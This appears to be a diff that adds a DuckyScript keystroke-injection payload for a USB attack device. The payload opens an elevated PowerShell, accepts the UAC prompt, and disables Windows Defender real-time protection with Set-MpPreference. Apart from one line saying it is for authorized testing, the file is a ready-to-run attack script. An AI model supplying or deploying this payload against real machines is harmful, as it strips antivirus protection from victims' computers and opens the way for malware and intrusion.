@@ -1,0 +1,29 @@
+REM Temporarily Disable Windows Defender
+REM Disables Windows Defender Real-time Protection temporarily
+REM WARNING: Only for authorized security testing!
+REM Requires admin privileges
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+CTRL SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+DELAY 500
+ENTER
+DELAY 2000
+STRING Write-Host "Windows Defender Real-time Protection disabled"
+DELAY 500
+ENTER
+DELAY 1000
+STRING Write-Host "To re-enable: Set-MpPreference -DisableRealtimeMonitoring $false"
+DELAY 500
+ENTER
+DELAY 2000
+STRING exit
+DELAY 500
+ENTER
